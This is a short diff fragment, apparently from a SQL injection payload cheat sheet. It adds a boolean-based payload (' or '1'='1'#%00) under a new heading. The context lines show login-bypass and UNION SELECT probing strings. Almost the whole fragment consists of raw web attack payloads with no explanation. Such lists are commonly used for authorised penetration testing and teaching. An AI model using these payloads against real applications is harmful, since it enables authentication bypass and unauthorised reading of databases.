@@ -18,6 +18,8 @@ admin'-- -
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 
+#boolean 
+' or '1'='1'#%00
 ## Union Based
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
